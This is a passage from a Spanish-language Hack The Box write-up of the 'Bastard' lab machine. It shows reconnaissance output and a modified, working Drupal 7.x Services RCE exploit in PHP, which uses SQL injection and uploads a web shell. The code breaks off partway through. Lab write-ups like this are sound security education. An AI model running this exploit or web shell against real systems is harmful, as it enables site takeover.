@@ -1,0 +1,1154 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Hack The Box Bastard - K4miyo      Ciberseguridad!      </title>
+<meta name="description" content="Resolución de la máquina Bastard en la plataforma de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
+<meta property="og:title" content="Hack The Box Bastard">
+<meta property="og:url" content="http://localhost:4000/htb-bastard/">
+
+
+  <meta property="og:description" content="Resolución de la máquina Bastard en la plataforma de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-bastard/bastard.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-10-09T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-bastard/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "K4miyo",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Artículos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscador</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >Contacto</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Hack The Box Bastard</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">K4miyo</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cyber Threat Inteligence Analyst
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hack The Box Bastard">
+    <meta itemprop="description" content="Resolución de la máquina Bastard en la plataforma de Hack The Box">
+    <meta itemprop="datePublished" content="October 09, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Bastard
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-10-09T00:00:00-05:00">October 09, 2021 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-bastard/banner-bastard.jpg" alt="" /></p>
+
+<h2 id="bastard">Bastard</h2>
+<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.9.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.9
+PING 10.10.10.9 <span class="o">(</span>10.10.10.9<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.9: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>136 ms
+
+<span class="nt">---</span> 10.10.10.9 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 136.110/136.110/136.110/0.000 ms
+</code></pre></div></div>
+
+<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.9 <span class="nt">-oG</span> allPorts
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-05 23:36 CDT
+Initiating SYN Stealth Scan at 23:36
+Scanning 10.10.10.9 <span class="o">[</span>65535 ports]
+Discovered open port 135/tcp on 10.10.10.9
+Discovered open port 80/tcp on 10.10.10.9
+Discovered open port 49154/tcp on 10.10.10.9
+Completed SYN Stealth Scan at 23:36, 26.41s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.9
+Host is up, received user-set <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2021-10-05 23:36:01 CDT <span class="k">for </span>27s
+Not shown: 65532 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT      STATE SERVICE REASON
+80/tcp    open  http    syn-ack ttl 127
+135/tcp   open  msrpc   syn-ack ttl 127
+49154/tcp open  unknown syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>26.50 seconds
+           Raw packets sent: 131085 <span class="o">(</span>5.768MB<span class="o">)</span> | Rcvd: 21 <span class="o">(</span>924B<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
+───────┬───────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼───────────────────────────────────────
+   1   │ 
+   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+   3   │ 
+   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.9
+   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 80,135,49154
+   6   │ 
+   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p80</span>,135,49154 10.10.10.9 <span class="nt">-oN</span> targeted
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-05 23:37 CDT
+Nmap scan report <span class="k">for </span>10.10.10.9
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Microsoft IIS httpd 7.5
+|_http-generator: Drupal 7 <span class="o">(</span>http://drupal.org<span class="o">)</span>
+| http-robots.txt: 36 disallowed entries <span class="o">(</span>15 shown<span class="o">)</span>
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
+|_http-server-header: Microsoft-IIS/7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+135/tcp   open  msrpc   Microsoft Windows RPC
+49154/tcp open  msrpc   Microsoft Windows RPC
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>66.37 seconds
+</code></pre></div></div>
+
+<p>Vemos que tiene el puerto 80 abierto; por lo que ya sabemos, antes de visualizar el contenido vía web, utilizaremos <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.9/
+http://10.10.10.9/ <span class="o">[</span>200 OK] Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.9], JQuery, MetaGenerator[Drupal 7 <span class="o">(</span>http://drupal.org<span class="o">)]</span>, Microsoft-IIS[7.5], PHP[5.3.28,], PasswordField[pass], Script[text/javascript], Title[Welcome to 10.10.10.9 | 10.10.10.9], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.3.28, ASP.NET]
+</code></pre></div></div>
+
+<p>Tenemos un Microsft IIS 7.5 y un CMS Drupal. Ahora si vamos a echarle un ojo.</p>
+
+<p><img src="/assets/images/htb-bastard/bastard-drupal.png" alt="" /></p>
+
+<p>Como observamos el CMS Drupal, por lo que podríamos tratar de probar credenciales default; sin embargo, vemos que no tenemos acceso. Analizando un poco la información obtenida de <code class="language-plaintext highlighter-rouge">nmap</code>, debería existir un recurso denominado <code class="language-plaintext highlighter-rouge">changelog.txt</code> en el cual podemos ver la versión del gestor de contenido.</p>
+
+<p><img src="/assets/images/htb-bastard/bastard-cms.png" alt="" /></p>
+
+<p>Vemos que se trata de <strong><em>Drupal 7.54</em></strong>, así que utilizamos <code class="language-plaintext highlighter-rouge">searchsploit</code> para observar algún exploit público:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit drupal 7.
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                                 |  Path
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Drupal 7.0 &lt; 7.31 - <span class="s1">'Drupalgeddon'</span> SQL Injection <span class="o">(</span>Add Admin User<span class="o">)</span>                              | php/webapps/34992.py
+Drupal 7.0 &lt; 7.31 - <span class="s1">'Drupalgeddon'</span> SQL Injection <span class="o">(</span>Admin Session<span class="o">)</span>                               | php/webapps/44355.php
+Drupal 7.0 &lt; 7.31 - <span class="s1">'Drupalgeddon'</span> SQL Injection <span class="o">(</span>PoC<span class="o">)</span> <span class="o">(</span>Reset Password<span class="o">)</span> <span class="o">(</span>1<span class="o">)</span>                    | php/webapps/34984.py
+Drupal 7.0 &lt; 7.31 - <span class="s1">'Drupalgeddon'</span> SQL Injection <span class="o">(</span>PoC<span class="o">)</span> <span class="o">(</span>Reset Password<span class="o">)</span> <span class="o">(</span>2<span class="o">)</span>                    | php/webapps/34993.php
+Drupal 7.0 &lt; 7.31 - <span class="s1">'Drupalgeddon'</span> SQL Injection <span class="o">(</span>Remote Code Execution<span class="o">)</span>                       | php/webapps/35150.php
+Drupal 7.12 - Multiple Vulnerabilities                                                         | php/webapps/18564.txt
+Drupal 7.x Module Services - Remote Code Execution                                             | php/webapps/41564.php
+Drupal &lt; 4.7.6 - Post Comments Remote Command Execution                                        | php/webapps/3313.pl
+Drupal &lt; 7.34 - Denial of Service                                                              | php/dos/35415.txt
+Drupal &lt; 7.34 - Denial of Service                                                              | php/dos/35415.txt
+Drupal &lt; 7.58 - <span class="s1">'Drupalgeddon3'</span> <span class="o">(</span>Authenticated<span class="o">)</span> Remote Code <span class="o">(</span>Metasploit<span class="o">)</span>                       | php/webapps/44557.rb
+Drupal &lt; 7.58 - <span class="s1">'Drupalgeddon3'</span> <span class="o">(</span>Authenticated<span class="o">)</span> Remote Code Execution <span class="o">(</span>PoC<span class="o">)</span>                    | php/webapps/44542.txt
+Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - <span class="s1">'Drupalgeddon2'</span> Remote Code Execution            | php/webapps/44449.rb
+Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - <span class="s1">'Drupalgeddon2'</span> Remote Code Execution            | php/webapps/44449.rb
+Drupal &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - <span class="s1">'Drupalgeddon2'</span> Remote Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>        | php/remote/44482.rb
+Drupal &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - <span class="s1">'Drupalgeddon2'</span> Remote Code Execution <span class="o">(</span>PoC<span class="o">)</span>               | php/webapps/44448.py
+Drupal &lt; 8.5.11 / &lt; 8.6.10 - RESTful Web Services unserialize<span class="o">()</span> Remote Command Execution <span class="o">(</span>Meta | php/remote/46510.rb
+Drupal &lt; 8.6.10 / &lt; 8.5.11 - REST Module Remote Code Execution                                 | php/webapps/46452.txt
+Drupal &lt; 8.6.9 - REST Module Remote Code Execution                                             | php/webapps/46459.py
+Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure                              | php/webapps/44501.txt
+Drupal Module CKEditor &lt; 4.1WYSIWYG <span class="o">(</span>Drupal 6.x/7.x<span class="o">)</span> - Persistent Cross-Site Scripting         | php/webapps/25493.txt
+Drupal Module Coder &lt; 7.x-1.3/7.x-2.6 - Remote Code Execution                                  | php/remote/40144.php
+Drupal Module Cumulus 5.x-1.1/6.x-1.4 - <span class="s1">'tagcloud'</span> Cross-Site Scripting                        | php/webapps/35397.txt
+Drupal Module RESTWS 7.x - PHP Remote Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>                              | php/remote/40130.rb
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+</code></pre></div></div>
+
+<p>Vemos un recurso interesante <strong>Drupal 7.x Module Services - Remote Code Execution</strong>, así que lo tratemos a nuestro entorno de trabajo, le modificamos el nombre a uno más descriptivo y procedemos a analizarlo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cd</span> ../content/
+❯ searchsploit <span class="nt">-m</span> php/webapps/41564.php
+  Exploit: Drupal 7.x Module Services - Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/41564
+     Path: /usr/share/exploitdb/exploits/php/webapps/41564.php
+File Type: ASCII text, with CRLF line terminators
+
+Copied to: /home/k4miyo/Documentos/HTB/Bastard/content/41564.php
+
+
+❯ ll
+.rw-r--r-- root root 8.5 KB Thu Oct  7 00:40:03 2021  41564.php
+❯ <span class="nb">mv </span>41564.php drupal_rce.php
+</code></pre></div></div>
+
+<p>Analizando el exploit, vemos que necesitamos realizarle unos cambios para que se adapte a lo que estamos buscando:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">$url = 'http://vmweb.lan/drupal-7.54'</code> lo cambiamos por <code class="language-plaintext highlighter-rouge">$url = 'http://10.10.10.9'</code>.</li>
+  <li><code class="language-plaintext highlighter-rouge">$endpoint_path = '/rest_endpoint'</code> si validamos el recurso, vemos que no existe; sin embargo, pensando un poco, vemos que busca el recurso <code class="language-plaintext highlighter-rouge">/rest_endpoint</code>, así que podríamos buscar por <code class="language-plaintext highlighter-rouge">/rest</code> el cual si existe.</li>
+</ul>
+
+<p><img src="/assets/images/htb-bastard/bastard-rest.png" alt="" /></p>
+
+<ul>
+  <li>Vemos que el exploit define un nombre archivo el cual va a ser subido para inyectar nuestro código malicioso <code class="language-plaintext highlighter-rouge">'filename' =&gt; 'dixuSOspsOUU.php',</code>; aquí podriamos ponerle el nombre que nosotros queramos, como por ejemplo <strong><em>k4mishell.php</em></strong>.</li>
+  <li>A nivel de data, se tiene esto <code class="language-plaintext highlighter-rouge">'data' =&gt; '&lt;?php eval(file_get_contents(\'php://input\')); ?&gt;'</code>; sin embargo, nosotros queremos utilizar una variable para poder ejecutar comandos; así que lo modificamos por <code class="language-plaintext highlighter-rouge">'data' =&gt; '&lt;?php system($_REQUEST["cmd"]); ?&gt;'</code>.</li>
+</ul>
+
+<p>Realizando las modificamos, tenemos lo siguiente:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Exploit Title: Drupal 7.x Services Module Remote Code Execution
+# Vendor Homepage: https://www.drupal.org/project/services
+# Exploit Author: Charles FOL
+# Contact: https://twitter.com/ambionics 
+# Website: https://www.ambionics.io/blog/drupal-services-module-rce
+
+
+#!/usr/bin/php
+<span class="cp">&lt;?php</span>
+<span class="c1"># Drupal Services Module Remote Code Execution Exploit</span>
+<span class="c1"># https://www.ambionics.io/blog/drupal-services-module-rce</span>
+<span class="c1"># cf</span>
+<span class="c1">#</span>
+<span class="c1"># Three stages:</span>
+<span class="c1"># 1. Use the SQL Injection to get the contents of the cache for current endpoint</span>
+<span class="c1">#    along with admin credentials and hash</span>
+<span class="c1"># 2. Alter the cache to allow us to write a file and do so</span>
+<span class="c1"># 3. Restore the cache</span>
+<span class="c1"># </span>
+
+<span class="c1"># Initialization</span>
+
+<span class="nb">error_reporting</span><span class="p">(</span><span class="k">E_ALL</span><span class="p">);</span>
+
+<span class="nb">define</span><span class="p">(</span><span class="s1">'QID'</span><span class="p">,</span> <span class="s1">'anything'</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'TYPE_PHP'</span><span class="p">,</span> <span class="s1">'application/vnd.php.serialized'</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'TYPE_JSON'</span><span class="p">,</span> <span class="s1">'application/json'</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'CONTROLLER'</span><span class="p">,</span> <span class="s1">'user'</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'ACTION'</span><span class="p">,</span> <span class="s1">'login'</span><span class="p">);</span>
+
+<span class="nv">$url</span> <span class="o">=</span> <span class="s1">'http://10.10.10.9/'</span><span class="p">;</span>
+<span class="nv">$endpoint_path</span> <span class="o">=</span> <span class="s1">'/rest'</span><span class="p">;</span>
+<span class="nv">$endpoint</span> <span class="o">=</span> <span class="s1">'rest_endpoint'</span><span class="p">;</span>
+
+<span class="nv">$file</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="s1">'filename'</span> <span class="o">=&gt;</span> <span class="s1">'k4miyo.php'</span><span class="p">,</span>
+    <span class="s1">'data'</span> <span class="o">=&gt;</span> <span class="s1">'&lt;?php system($_REQUEST["cmd"]); ?&gt;'</span>
+<span class="p">];</span>
+
+<span class="nv">$browser</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Browser</span><span class="p">(</span><span class="nv">$url</span> <span class="o">.</span> <span class="nv">$endpoint_path</span><span class="p">);</span>
+
+
+<span class="c1"># Stage 1: SQL Injection</span>
+
+<span class="kd">class</span> <span class="nc">DatabaseCondition</span>
+<span class="p">{</span>
+    <span class="k">protected</span> <span class="nv">$conditions</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="s2">"#conjunction"</span> <span class="o">=&gt;</span> <span class="s2">"AND"</span>
+    <span class="p">];</span>
+    <span class="k">protected</span> <span class="nv">$arguments</span> <span class="o">=</span> <span class="p">[];</span>
+    <span class="k">protected</span> <span class="nv">$changed</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$queryPlaceholderIdentifier</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$stringVersion</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">__construct</span><span class="p">(</span><span class="nv">$stringVersion</span><span class="o">=</span><span class="kc">null</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">stringVersion</span> <span class="o">=</span> <span class="nv">$stringVersion</span><span class="p">;</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$stringVersion</span><span class="p">))</span>
+        <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">changed</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">stringVersion</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">class</span> <span class="nc">SelectQueryExtender</span> <span class="p">{</span>
+    <span class="c1"># Contains a DatabaseCondition object instead of a SelectQueryInterface</span>
+    <span class="c1"># so that $query-&gt;compile() exists and (string) $query is controlled by us.</span>
+    <span class="k">protected</span> <span class="nv">$query</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+
+    <span class="k">protected</span> <span class="nv">$uniqueIdentifier</span> <span class="o">=</span> <span class="nx">QID</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$connection</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$placeholder</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">__construct</span><span class="p">(</span><span class="nv">$sql</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DatabaseCondition</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nv">$cache_id</span> <span class="o">=</span> <span class="s2">"services:</span><span class="nv">$endpoint</span><span class="s2">:resources"</span><span class="p">;</span>
+<span class="nv">$sql_cache</span> <span class="o">=</span> <span class="s2">"SELECT data FROM </span><span class="si">{</span><span class="nv">cache</span><span class="si">}</span><span class="s2"> WHERE cid='</span><span class="nv">$cache_id</span><span class="s2">'"</span><span class="p">;</span>
+<span class="nv">$password_hash</span> <span class="o">=</span> <span class="s1">'$S$D2NH.6IZNb1vbZEV1F0S9fqIz3A0Y1xueKznB8vWrMsnV/nrTpnd'</span><span class="p">;</span>
+
+<span class="c1"># Take first user but with a custom password</span>
+<span class="c1"># Store the original password hash in signature_format, and endpoint cache</span>
+<span class="c1"># in signature</span>
+<span class="nv">$query</span> <span class="o">=</span> 
+    <span class="s2">"0x3a) UNION SELECT ux.uid AS uid, "</span> <span class="o">.</span>
+    <span class="s2">"ux.name AS name, '</span><span class="nv">$password_hash</span><span class="s2">' AS pass, "</span> <span class="o">.</span>
+    <span class="s2">"ux.mail AS mail, ux.theme AS theme, (</span><span class="nv">$sql_cache</span><span class="s2">) AS signature, "</span> <span class="o">.</span>
+    <span class="s2">"ux.pass AS signature_format, ux.created AS created, "</span> <span class="o">.</span>
+    <span class="s2">"ux.access AS access, ux.login AS login, ux.status AS status, "</span> <span class="o">.</span>
+    <span class="s2">"ux.timezone AS timezone, ux.language AS language, ux.picture "</span> <span class="o">.</span>
+    <span class="s2">"AS picture, ux.init AS init, ux.data AS data FROM </span><span class="si">{</span><span class="nv">users</span><span class="si">}</span><span class="s2"> ux "</span> <span class="o">.</span>
+    <span class="s2">"WHERE ux.uid&lt;&gt;(0"</span>
+<span class="p">;</span>
+
+<span class="nv">$query</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SelectQueryExtender</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
+<span class="nv">$data</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'username'</span> <span class="o">=&gt;</span> <span class="nv">$query</span><span class="p">,</span> <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'ouvreboite'</span><span class="p">];</span>
+<span class="nv">$data</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+
+<span class="nv">$json</span> <span class="o">=</span> <span class="nv">$browser</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="nx">TYPE_PHP</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+
+<span class="c1"># If this worked, the rest will as well</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$json</span><span class="o">-&gt;</span><span class="na">user</span><span class="p">))</span>
+<span class="p">{</span>
+    <span class="nb">print_r</span><span class="p">(</span><span class="nv">$json</span><span class="p">);</span>
+    <span class="nx">e</span><span class="p">(</span><span class="s2">"Failed to login with fake password"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1"># Store session and user data</span>
+
+<span class="nv">$session</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="s1">'session_name'</span> <span class="o">=&gt;</span> <span class="nv">$json</span><span class="o">-&gt;</span><span class="na">session_name</span><span class="p">,</span>
+    <span class="s1">'session_id'</span> <span class="o">=&gt;</span> <span class="nv">$json</span><span class="o">-&gt;</span><span class="na">sessid</span><span class="p">,</span>
+    <span class="s1">'token'</span> <span class="o">=&gt;</span> <span class="nv">$json</span><span class="o">-&gt;</span><span class="na">token</span>
+<span class="p">];</span>
+<span class="nx">store</span><span class="p">(</span><span class="s1">'session'</span><span class="p">,</span> <span class="nv">$session</span><span class="p">);</span>
+
+<span class="nv">$user</span> <span class="o">=</span> <span class="nv">$json</span><span class="o">-&gt;</span><span class="na">user</span><span class="p">;</span>
+
+<span class="c1"># Unserialize the cached value</span>
+<span class="c1"># Note: Drupal websites admins, this is your opportunity to fight back :)</span>
+<span class="nv">$cache</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="na">signature</span><span class="p">);</span>
+
+<span class="c1"># Reassign fields</span>
+<span class="nv">$user</span><span class="o">-&gt;</span><span class="na">pass</span> <span class="o">=</span> <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">signature_format</span><span class="p">;</span>
+<span class="nb">unset</span><span class="p">(</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="na">signature</span><span class="p">);</span>
